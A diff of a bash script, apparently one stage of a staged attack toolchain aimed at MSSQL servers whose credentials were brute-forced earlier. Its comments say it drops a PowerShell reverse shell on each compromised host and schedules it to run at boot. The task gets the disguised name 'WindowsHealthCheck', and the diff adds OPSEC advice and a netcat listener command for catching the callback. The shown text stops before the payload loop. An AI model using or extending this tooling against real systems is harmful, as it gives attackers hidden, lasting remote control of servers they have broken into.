@@ -1,7 +1,9 @@
 #!/usr/bin/env bash
 
-# Establishes persistence on compromised MSSQL hosts via scheduled tasks.
-# Creates a recurring schtasks entry that runs a payload on system boot.
+# 05_persist — Establish Persistence via Scheduled Task
+
+# For each compromised MSSQL host, drops a PowerShell reverse shell script
+# to disk and creates a scheduled task that fires on system boot.
 
 OUTDIR="./recon"
 CREDS_FILE="$OUTDIR/hosts/mssql-creds.txt"
@@ -10,7 +12,12 @@ mkdir -p "$PERSIST_DIR"
 
 LHOST=$(ip -br a | grep -v '^lo' | awk '{print $3}' | cut -d/ -f1 | head -1)
 LPORT="${1:-4444}"
+
+# CONFIGURABLE TASK NAME -- Change this if your engagement requires a
+# different name for OPSEC or to avoid collisions with real scheduled tasks.
+
 TASK_NAME="WindowsHealthCheck"
+
 
 if [[ ! -f "$CREDS_FILE" ]]; then
     echo "[-] $CREDS_FILE not found. Run 02_bruteforce first."
@@ -20,6 +27,12 @@ fi
 echo "[*] Starting persistence phase"
 echo "[*] Attacker IP: $LHOST  |  Callback port: $LPORT"
 echo "[*] Scheduled task name: $TASK_NAME"
+echo ""
+echo "[ ! ] You can change the scheduled task name by editing the TASK_NAME"
+echo "      variable at the top of this script (currently: $TASK_NAME)."
+echo ""
+echo "[ ! ] To verify persistence, start a listener before rebooting the target:"
+echo "      nc -nlvp $LPORT"
 echo ""
 
 while IFS=: read -r TARGET_IP TARGET_PORT USER PASS; do
